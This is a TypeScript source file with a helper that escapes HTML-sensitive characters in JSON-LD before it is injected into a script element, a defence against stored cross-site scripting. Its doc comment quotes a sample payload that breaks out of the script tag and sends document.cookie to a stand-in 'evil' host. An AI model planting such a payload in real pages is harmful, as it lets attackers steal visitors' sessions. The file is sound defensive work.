/**
 * Safe serialisation for JSON-LD written into a `<script>` element.
 *
 * `JSON.stringify` escapes what JSON requires — quotes, backslashes, control
 * characters — and nothing more. It leaves `<` and `/` exactly as they are, so
 * a value containing `</script>` closes the element early and everything after
 * it is parsed as markup. A product name is enough to do it:
 *
 *     { "name": "Bag</script><script>fetch('//evil/'+document.cookie)</script>" }
 *
 * That is a stored cross-site scripting hole on every page carrying the block,
 * and no amount of care in the surrounding JSX prevents it, because the whole
 * point of `dangerouslySetInnerHTML` is that React stops escaping.
 *
 * ── Why this is still valid JSON-LD ────────────────────────────────────────
 *
 * The replacements below are `\uXXXX` sequences, which JSON defines as
 * equivalent to the characters they name. A parser reading `<` yields
 * `<`. Google, Bing and every other consumer therefore see exactly the
 * structured data they saw before — the difference exists only in the HTML
 * source, where the characters that could end the element no longer appear
 * literally.
 *
 * ── What is escaped, and why each one ──────────────────────────────────────
 *
 *   <  U+003C  opens a tag. `</script` is the breakout; escaping `<` ends it.
 *   >  U+003E  closes a tag. Not exploitable on its own, escaped so that no
 *              literal angle bracket survives in the output at all.
 *   &  U+0026  begins an HTML entity. Escaped so a crafted value cannot smuggle
 *              markup through an entity-decoding step somewhere downstream.
 *   U+2028     line separator.
 *   U+2029     paragraph separator. Both are legal inside a JSON string but
 *              were historically statement terminators in JavaScript source.
 *              This text is embedded in a document rather than read in
 *              isolation, and escaping them costs nothing.
 *
 * Escaping is applied to the serialised string rather than to the input values,
 * so it covers every key at every level of nesting without any call site having
 * to remember which of its fields came from the database.
 *
 * The characters are matched by code point rather than written literally:
 * U+2028 and U+2029 are invisible, and source that depends on them surviving a
 * copy, a diff view or an editor's encoding is source waiting to break quietly.
 */
const HTML_UNSAFE = /[<>&\u2028\u2029]/g;

function escapeChar(char: string): string {
  switch (char.charCodeAt(0)) {
    case 0x3c:
      return "\\u003c";
    case 0x3e:
      return "\\u003e";
    case 0x26:
      return "\\u0026";
    case 0x2028:
      return "\\u2028";
    case 0x2029:
      return "\\u2029";
    default:
      return char;
  }
}

/**
 * Serialise a JSON-LD object for use with `dangerouslySetInnerHTML`.
 *
 * Use this in place of `JSON.stringify` at every structured-data call site.
 */
export function safeJsonLd(data: unknown): string {
  return JSON.stringify(data).replace(HTML_UNSAFE, escapeChar);
}
